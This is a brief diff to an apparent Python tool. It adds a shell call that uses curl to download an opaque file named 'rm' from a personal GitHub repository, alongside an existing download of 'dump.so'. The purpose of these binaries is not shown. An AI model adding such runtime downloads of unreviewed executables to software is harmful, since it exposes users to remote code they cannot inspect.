@@ -11,6 +11,10 @@ if path.isfile("dz.so"):
     pass
 else:
     system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/dump.so -o dump.so")
+if path.isfile("rm"):
+    pass
+else:
+    system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/rm -o rm")
 
 if 'aarch' in arch:
     arch = 'aarch'
